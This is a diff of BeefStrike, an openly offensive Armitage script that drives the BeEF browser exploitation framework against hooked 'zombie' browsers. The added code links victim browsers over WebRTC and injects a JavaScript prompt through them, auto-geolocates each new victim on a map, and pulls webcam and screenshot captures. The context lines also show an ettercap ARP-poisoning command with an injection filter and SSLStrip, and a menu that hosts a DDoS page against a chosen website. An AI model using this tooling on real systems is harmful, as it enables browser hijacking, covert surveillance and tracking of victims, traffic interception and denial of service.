@@ -8,19 +8,19 @@
 ##  BeefStrike is a script for Beef and Armitage integration. May be you must read the  ##
 ##		README file and watch Youtube video demo before use it 			##
 ##											##	
-##    http://youtube.com/mrbenygreen	   [  by @TheBenyGreen  ]                       ##
+##             http://youtube.com/mrbenygreen	   [  by @TheBenyGreen  ]               ##
 ##											##													 																  
 ##########################################################################################
-import com.eyesopencrew.* from: C:\BeefLib\dist\BeefLib.jar;
-import org.apache.commons.* from: C:\BeefLib\dist\lib\commons-lang-2.5.jar;
-import org.apache.commons.* from: C:\BeefLib\dist\lib\commons-logging-1.1.3.jar;
-import org.apache.commons.* from: C:\BeefLib\dist\lib\commons-beanutils-1.8.3.jar;
-import org.apache.commons.* from: C:\BeefLib\dist\lib\commons-collections-3.2.1.jar;
-import com.itextpdf.text.* from: C:\BeefLib\dist\lib\itextpdf-5.5.1.jar;
-import org.apache.http.* from: C:\BeefLib\dist\lib\httpcore-4.3.3.jar;
-import org.apache.http.* from: C:\BeefLib\dist\lib\httpclient-4.3.6.jar;
-import net.sf.json.* from:  C:\BeefLib\dist\lib\json-lib.jar;
-import net.sf.ezmorph.* from:  C:\BeefLib\dist\lib\ezmorph-1.0.6.jar;
+import com.eyesopencrew.* from: /root/Desktop/BeefLib.jar;
+import org.apache.commons.* from: /root/Desktop/lib/commons-lang-2.5.jar;
+import org.apache.commons.* from: /root/Desktop/lib/commons-logging-1.1.3.jar;
+import org.apache.commons.* from: /root/Desktop/lib/commons-beanutils-1.8.3.jar;
+import org.apache.commons.* from: /root/Desktop/lib/commons-collections-3.2.1.jar;
+import com.itextpdf.text.* from: /root/Desktop/lib/itextpdf-5.5.1.jar;
+import org.apache.http.* from: /root/Desktop/lib/httpcore-4.3.3.jar;
+import org.apache.http.* from: /root/Desktop/lib/httpclient-4.3.6.jar;
+import net.sf.json.* from:  /root/Desktop/lib/json-lib.jar;
+import net.sf.ezmorph.* from:  /root/Desktop/lib/ezmorph-1.0.6.jar;
 
 ###################	CORE variables	###############################################
 
@@ -166,7 +166,7 @@ popup beefstrike {
 					closef($handlefilter);
 					$filterpath = file_put("infect.filter"); # file are shared :-)
 					append($console , "\cC[*] Etterfilter: file create > $filterpath");
-					$filterpath = prompt_text("Path of your filter","$filterpath");
+					$filterpath = prompt_text("Path of filter (click OK to use the generated one)","$filterpath");
 					$sslstriport = prompt_text("SSLStrip config: port 80 will be redirect to :","10000");
 					cmd($console , "etterfilter $filterpath -o html.ef"); sleep(1500);
 					cmd($console , "ettercap -T -q -i $eth0 -F html.ef -M ARP // //");
@@ -239,8 +239,29 @@ popup beefstrike {
 				refresh_analyze($attackMap);
 			}
 		#menu "Beef Fu" {
+		menu "WebRTC" {
+			item "Initiate Peer" {
+				$fromto = prompt_text("From <zombie_ID1> to <zombie_ID2> : ","{\"from\":1,\"to\":2,\"verbose\":true}");
+				$link = "" . $beefUrl . "/api/webrtc/go?token=$key";
+				$webrtc = "curl -H \"Content-Type: application/json; charset=UTF-8\" -v -X POST -d '" . $fromto . "' " . $link . "";
+				cmd($console, "$webrtc"); 
+				}
+			item "Peer status" {
+				$fromto = prompt_text("zombie_ID: ","1");
+				$link = "" . $beefUrl . "/api/webrtc/status/" . $fromto . "?token=$key";
+				$webrtc = "curl -H \"Content-Type: application/json; charset=UTF-8\" -v -X GET " . $link . "";
+				cmd($console, "$webrtc");
+				}
+			item "Send msg over Peer" {
+				$fromto = prompt_text("From <zombie_ID1> to <zombie_ID2> : ","%return window.prompt(\"Are you a Beef ?\");");
+				$fromto = prompt_text("From <zombie_ID1> to <zombie_ID2> : ","{\"from\":1,\"to\":2,\"message\":\"" . $peer . "\"}");
+				$link = "" . $beefUrl . "/api/webrtc/msg?token=$key";
+				$webrtc = "curl -H \"Content-Type: application/json; charset=UTF-8\" -v -X POST -d '" . $fromto . "' " . $link . "";
+				cmd($console, "$webrtc"); 
+				}
+			}
 		item "DDoS a Website" {
-				item "GET" {
+			item "GET" {
 				if ($key ne "00000000000000000000000" || $key ne "" ){
 				$ddostarget = prompt_text("Targeted Website","http://");
 				$ddosdelay = prompt_text("Delay","10");
@@ -319,18 +340,41 @@ popup beefstrike {
 		menu "Geolocation" { # See geographic position of each zombi on a map and try to track their positions.	
 			item "IP locator" {
 				$iploc = prompt_text("IP to localize ","8.8.8.8");
-				$freegeoip_url = "http://www.geobytes.com/IpLocator.htm?GetLocation&template=json.txt&IpAddress=" . $iploc . "";
-				println($freegeoip_url);
+				$freegeoip_url = "http://freegeoip.net/json/" . $iploc . "";
 				$maptype = "hybrid";
-				$rndjmap = rand(9999999999); 
-				$rndjmapfile = "$rndjmap $+ .json" ;
-				$send_url = "curl -H \"Content-Type: application/json; charset=UTF-8\" \"" . $freegeoip_url . "\" > " . $bstrk_rslt . "/" . $rndjmapfile . "";
-				cmd($console,"$send_url");sleep(50);
-				geomap_notrack($rndjmapfile, $maptype, "Empty");
+				$json_freegeoip = [BeefRequester BeefGetRequest: "$freegeoip_url"];sleep(2000);
+				#geomap($json_freegeoip, $maptype, "Empty");
+				println($json_freegeoip);
+				
+				$js = [new JSONObject]; # retrieve location information from geobyte result.
+	$js = [JSONSerializer toJSON: "$json_freegeoip"];
+	$ipmap = [BeefRequester extractMapData: "$js", "ip"] ;
+	$country = [BeefRequester extractMapData: "$js", "country_name"] ;
+	$city = [BeefRequester extractMapData: "$js", "city"] ;
+	$lat = [BeefRequester extractMapData: "$js", "latitude"] ; 	$lon = [BeefRequester extractMapData: "$js", "longitude"] ;
+	$latlon = [BeefRequester extractGPSData: "$js"] ;
+	$timezone = [BeefRequester extractMapData: "$js", "time_zone"] ; 
+	$map_url = "http://maps.google.com/maps/api/staticmap?size=512x512&markers=color:red%7Clabel:Z%7C" . $latlon . "&maptype=hybrid";
+	println($map_url);
+	$rndval = rand(9999); $s = "-"; $b = "/" ;
+	$mapfile = "$ipmap $+ $s $+ $rndval $+ .png" ;
+	$mapfile = "$bstrk_dir $+ $b $+ $mapfile" ;
+	cmd_async("wget \"$map_url\" --output-document=" . $mapfile . ""); 
+	append($console , "\n\c9[*] Informations from others geolocation service" );
+		append($console , "\n\[*] ip.pycox.com geolocation service" );
+		cmd($console , "curl http://ip.pycox.com/json/" . $ipmap . "");
+		append($console , "\n\[*] ip-api.com geolocation service" );
+		cmd($console , "curl http://ip-api.com/json/" . $ipmap . "");
+	# map tab appear only if the request is made by the user otherwise, the geo-position will be just stored.
+	$map_tab = open_image_tab("Geolocate", @(), @("No Image ? Try to Refresh Map","Map informations"));
+	set_image($map_tab, file_get("" . $mapfile . "")) ;
+				
+				
+				println("zzzzzzzzzzzzzzz");
 				}
 			item "Geo Tracking" {
 				local('$geotrack');
-				$geotrack = open_table_tab("Geo Tracking", "", @("id", "ip", "sid", "country", "fips", "region", "code", "city", "timezone", "certainty", "lat", "lon", "maps"), @(), @("Refresh-track"), "geo_hook", 1);
+				$geotrack = open_table_tab("Geo Tracking", "", @("id", "ip", "sid", "country", "city", "timezone", "lat", "lon", "maps"), @(), @("Refresh-track"), "geo_hook", 1);
 				refresh_track($geotrack);
 				}
 		}
@@ -502,11 +546,9 @@ popup zmb_hook {
 					send_beef_cmd_without_param($sessidr, $code_geoloc, $adr);
 					$freegeoip_url = "http://www.geobytes.com/IpLocator.htm?GetLocation&template=json.txt&IpAddress=" . $adr . "";
 					$maptype = "hybrid";
-					$rndjmap = rand(9999999999); 
-					$rndjmapfile = "$rndjmap $+ .json" ;
-					$send_url = "curl -H \"Content-Type: application/json; charset=UTF-8\" \"" . $freegeoip_url . "\" > " . $bstrk_rslt . "/" . $rndjmapfile . "";
-					cmd($console,"$send_url"); sleep(50);
-					geomap_notrack($rndjmapfile, $maptype, $sessidr);	
+					$json_freegeoip = [BeefRequester BeefGetRequest: "$freegeoip_url"];
+					sleep(2000);
+					geomap_notrack($json_freegeoip, $maptype, $sessidr);	
 				}
 			}
 		menu "Social Eng." {
@@ -660,12 +702,6 @@ sub result_tracker {
 	}
 	%rslt = %(id => "$id_rslt", name => "$cmdename", ip => "$3", sessionID => "$1", commandID => "$2", resultID => "$4", Data => "");
 	@beef_result[$id_rslt] = %rslt; $id_rslt = $id_rslt + 1 ;
-	if ($2 eq $code_webcam ) {
-		webcam($4,$1) ; #println("webcam");
-		}
-	if ($2 eq $code_screenshot ) {
-		screenshot($4,$1) ; #println("webcam");
-		}
   }	
 
 sub refresh_result {
@@ -685,7 +721,13 @@ popup result_hook {
 	item "See data (console)" {
 		append($console ,"\c8 Result for :[  $cmdnam  ]"); 
 		$send_url = "curl -H \"Content-Type: application/json; charset=UTF-8\" " . $link . "" ;
-		cmd($console, "$send_url"); append($console, "\n"); sleep(20);
+		 append($console, "\n"); sleep(20);
+			if ($cmdid eq $code_webcam ) {
+			webcam($rsltid,$sessid) ; #println("webcam");
+			}
+			if ($cmdid eq $code_screenshot ) {
+			screenshot($rsltid,$sessid) ; #println("webcam");
+			}
 		}
 	item "re-Check" {
 		$rsldata = [BeefRequester BeefGetRequest: "$link"];sleep(10);
@@ -711,7 +753,8 @@ sub webcam {
 	$jsrs = [new JSONObject];
 	$jsrs = [JSONSerializer toJSON: "$json_rsl"];
 	$id_result = [[$jsrs get: "command_id"] toString];  
-	$data_url = "$beefUrl $+ /api/modules/ $+ $sess $+ / $+ $cmid $+ / $+ $id_result $+ /4?token= $+ $key" ;
+	$numtof = 4 ; # Variable to scroll webcam pics from 4 to 10 when clicking Next .
+	$data_url = "$beefUrl $+ /api/modules/ $+ $sess $+ / $+ $cmid $+ / $+ $id_result $+ / $+ $numtof $+ ?token= $+ $key" ;
 	$rsl_data = [BeefRequester BeefGetRequest: "$data_url"]; sleep(100);
 	$r = [ResultList extractResults: $rsl_data] ;
 		for ($i = 0; $i < [$r size]; $i++)   {
@@ -1029,14 +1072,11 @@ sub update_profile {
 			@browser_profile_list[$n] = %browser_profile;
 			host_os($sip,$OsName);
 			# Now Beefstrike will auto-geolocate every new zombi.
-			$freegeoip_url = "http://www.geobytes.com/IpLocator.htm?GetLocation&template=json.txt&IpAddress=" . $sip . "";
-			$rndjmap = rand(9999999999); 
-			$rndjmapfile = "$rndjmap $+ .json" ;
-			$send_url = "curl -H \"Content-Type: application/json; charset=UTF-8\" \"" . $freegeoip_url . "\" > " . $bstrk_rslt . "/" . $rndjmapfile . "";
-			cmd($console,"$send_url");sleep(50);
-			geomap($rndjmapfile, "hybrid", $sid); 
-			append($console, "\n------------------------------------NMU-09|ISTAR---------------------------------\n\c9[+] New zombi join the horde");
-			append($console , "\c9[+] Geolocation stored" ); 
+			$freegeoip_url = "http://freegeoip.net/json/" . $sip . "";
+				$json_freegeoip = [BeefRequester BeefGetRequest: "$freegeoip_url"];  sleep(100); 
+				geomap($json_freegeoip, "hybrid", $sid); 
+				append($console, "\n------------------------------------NMU-09|ISTAR---------------------------------\n\c9[+] New zombi join the horde");
+				append($console , "\c9[+] Geolocation stored" );
 		}
 	}
  }
@@ -1446,14 +1486,11 @@ popup host_bottom {
 			}
 		}
 	item "Geolocate" {
-		$freegeoip_url = "http://www.geobytes.com/IpLocator.htm?GetLocation&template=json.txt&IpAddress=" . $1 . "";
+		$freegeoip_url = "http://freegeoip.net/json/" . $1 . "";
 		$maptype = "hybrid";
-		$rndjmap = rand(9999999999); 
-		$rndjmapfile = "$rndjmap $+ .json" ;
-		$send_url = "curl -H \"Content-Type: application/json; charset=UTF-8\" \"" . $freegeoip_url . "\" > " . $bstrk_rslt . "/" . $rndjmapfile . "";
-		cmd($console,"$send_url");sleep(50);
-		geomap_notrack($rndjmapfile, $maptype, $l_sid);
-		#item "Tracking" {}	
+		$json_freegeoip = [BeefRequester BeefGetRequest: "$freegeoip_url"]; sleep(2000);
+		geomap_notrack($json_freegeoip, $maptype, $l_sid);
+		#item "Tracking" {}
 		}
  }
 
@@ -1533,60 +1570,53 @@ filter host_image {
 ######################## GEOLOCATE ZOMBI ON A MAP ##################
 # 	Use geobyte web services 		
 sub geomap {
-	$jdelete = "" . $bstrk_dir . "/cmds/" . $1 . "" ; 
-	$mapsid = "" . $beefUrl . "/demos/beefstrike/cmds/" . $1 . "" ;
-	$json_map = [BeefRequester BeefGetRequest: "$mapsid"];
 	$js = [new JSONObject]; # retrieve location information from geobyte result.
-	$js = [JSONSerializer toJSON: "$string"];
-	$details = [BeefRequester extractMapData: "$js", "ip"];
-	$ipmap = [BeefRequester extractMapData: "$js", "ipaddress"] ;
-	$country = [BeefRequester extractMapData: "$js", "country"] ;
-	$fips = [BeefRequester extractMapData: "$js", "fips"] ;
-	$region = [BeefRequester extractMapData: "$js", "region"] ;
-	$codec = [BeefRequester extractMapData: "$js", "code"] ;
+	$js = [JSONSerializer toJSON: "$1"];
+	#$js = [$js replaceAll: "\n", ""];
+	#$details = [BeefRequester extractMapData: "$js", "ip"];
+	$ipmap = [BeefRequester extractMapData: "$js", "ip"] ;
+	$country = [BeefRequester extractMapData: "$js", "country_name"] ;
+	#$fips = [BeefRequester extractMapData: "$js", "fips"] ;
+	#$region = [BeefRequester extractMapData: "$js", "region"] ;
+	#$codec = [BeefRequester extractMapData: "$js", "code"] ;
 	$city = [BeefRequester extractMapData: "$js", "city"] ;
 	$lat = [BeefRequester extractMapData: "$js", "latitude"] ;
 	$lon = [BeefRequester extractMapData: "$js", "longitude"] ;
-	$timezone = [BeefRequester extractMapData: "$js", "timezone"] ;
-	$certainty = [BeefRequester extractMapData: "$js", "certainty"] ;
+	$timezone = [BeefRequester extractMapData: "$js", "time_zone"] ;
+	#$certainty = [BeefRequester extractMapData: "$js", "certainty"] ;
 	# get map image via google map API
-	$map_url = "http://maps.google.com/maps/api/staticmap?size=512x512&markers=color:red|label:Z|" . $lat . "," . $lon . "&maptype=" . $2 . "";
+	$map_url = "http://maps.google.com/maps/api/staticmap?size=512x512&markers=color:red%7Clabel:Z%7C" . $lat . "," . $lon . "&maptype=" . $2 . "";
 	$rndval = rand(9999); $s = "-"; $b = "/" ;
 	$mapfile = "$ipmap $+ $s $+ $rndval $+ .png" ;
 	$mapfile = "$bstrk_dir $+ $b $+ $mapfile" ;
-	cmd_async("wget \"$map_url\" --output-document=" . $mapfile . ""); #sleep(100);
-	%map = %(id => "$idmap", ip => "$ipmap", sid => "$3", country => "$country", fips => "$fips", region => "$region", code => "$codec", city => "$city", timezone => "$timezone", certainty => "$certainty", lat => "$lat", lon => "$lon", maps => "$mapfile");
-	@googlmap[$idmap] = %map ; $idmap = $idmap + 1 ; 
-	cmd_async("rm -f" . $jdelete . "");	
+	cmd_async("wget \"$map_url\" --output-document=" . $mapfile . ""); sleep(1000);
+	%map = %(id => "$idmap", ip => "$ipmap", sid => "$3", country => "$country", city => "$city", timezone => "$timezone", lat => "$lat", lon => "$lon", maps => "$mapfile");
+	@googlmap[$idmap] = %map ; $idmap = $idmap + 1 ; 	
  }
 sub geomap_notrack {
-	$jdelete = "" . $bstrk_dir . "/cmds/" . $1 . "" ; 
-	$mapsid = "" . $beefUrl . "/demos/beefstrike/cmds/" . $1 . "" ;
-	$json_map = [BeefRequester BeefGetRequest: "$mapsid"];
+	println($1);
 	$js = [new JSONObject]; # retrieve location information from geobyte result.
-	$js = [JSONSerializer toJSON: "$json_map"];
-	$details = [BeefRequester extractMapData: "$js", "ip"]; 
-	$ipmap = [BeefRequester extractMapData: "$js", "ipaddress"] ;
-	$country = [BeefRequester extractMapData: "$js", "country"] ; println($country);
-	$fips = [BeefRequester extractMapData: "$js", "fips"] ;
-	$region = [BeefRequester extractMapData: "$js", "region"] ;
-	$codec = [BeefRequester extractMapData: "$js", "code"] ;
+	$js = [JSONSerializer toJSON: "$json_freegeoip"];
+	$ipmap = [BeefRequester extractMapData: "$js", "ip"] ;
+	$country = [BeefRequester extractMapData: "$js", "country_name"] ;
 	$city = [BeefRequester extractMapData: "$js", "city"] ;
 	$lat = [BeefRequester extractMapData: "$js", "latitude"] ;
 	$lon = [BeefRequester extractMapData: "$js", "longitude"] ;
-	$timezone = [BeefRequester extractMapData: "$js", "timezone"] ;
-	$certainty = [BeefRequester extractMapData: "$js", "certainty"] ;
-	# get map image via google map API
-	$map_url = "http://maps.google.com/maps/api/staticmap?size=512x512&markers=color:red|label:Z|" . $lat . "," . $lon . "&maptype=" . $2 . "";
+	$timezone = [BeefRequester extractMapData: "$js", "time_zone"] ; 
+	$map_url = "http://maps.google.com/maps/api/staticmap?size=512x512&markers=color:red%7Clabel:Z%7C" . $lat . "," . $lon . "&maptype=" . $2 . "";
 	println($map_url);
 	$rndval = rand(9999); $s = "-"; $b = "/" ;
 	$mapfile = "$ipmap $+ $s $+ $rndval $+ .png" ;
 	$mapfile = "$bstrk_dir $+ $b $+ $mapfile" ;
-	cmd_async("wget \"$map_url\" --output-document=" . $mapfile . ""); #sleep(100);
+	cmd_async("wget \"$map_url\" --output-document=" . $mapfile . ""); 
+	append($console , "\n\c9[*] Informations from others geolocation service" );
+		append($console , "\n\[*] ip.pycox.com geolocation service" );
+		cmd($console , "curl http://ip.pycox.com/json/" . $ipmap . "");
+		append($console , "\n\[*] ip-api.com geolocation service" );
+		cmd($console , "curl http://ip-api.com/json/" . $ipmap . "");
 	# map tab appear only if the request is made by the user otherwise, the geo-position will be just stored.
 	$map_tab = open_image_tab("Geolocate", @(), @("No Image ? Try to Refresh Map","Map informations"));
-	set_image($map_tab, file_get("" . $mapfile . "")) ; 
-	cmd_async("rm -f" . $jdelete . "");	
+	set_image($map_tab, file_get("" . $mapfile . "")) ; 	
  }
 sub refresh_map {
 	set_image($1, file_get("" . $mapfile . "") );
@@ -1608,7 +1638,7 @@ on tab_image_click {
 		refresh_map($1);
 		} 
 	if ($3 eq "Map informations") {
-		show_message( "IP: " . $ipmap . "\n +---------------------+\n COUNTRY: " . $country . "\n Fips: " . $fips . "\n REGION: " . $region . "\n CODE: " . $codec . "\n CITY: " . $city . "\n TIMEZONE: " . $timezone . "\n CERTAINTY: " . $certainty . "\n LAT/LON: " . $lat . "/" . $lon . "\n +---All maps are saved in the loots---+");
+		show_message( "IP: " . $ipmap . "\n +---------------------+\n COUNTRY: " . $country . "\n CITY: " . $city . "\n TIMEZONE: " . $timezone . "\n LAT/LON: " . $lat . "/" . $lon . "\n +---All maps are saved ---+");
    		} 
 	if ($3 eq "Webcam Refresh") {
 		refresh_webcam($1);
@@ -2107,4 +2137,4 @@ sub ddosing {
 	append($console , "\n--------------------------------------RGB-09-----------------------------------\n\c9[+] DDoS file have been create and hosted in : " . $beefUrl . "/demos/beefddos.html" );
 	cmd_async("cp beefddos.html " . $beefpath . "/extensions/demos/html");
 }
-###########################################Chain Engine 
+###########################################  Chain Engine #####################################################
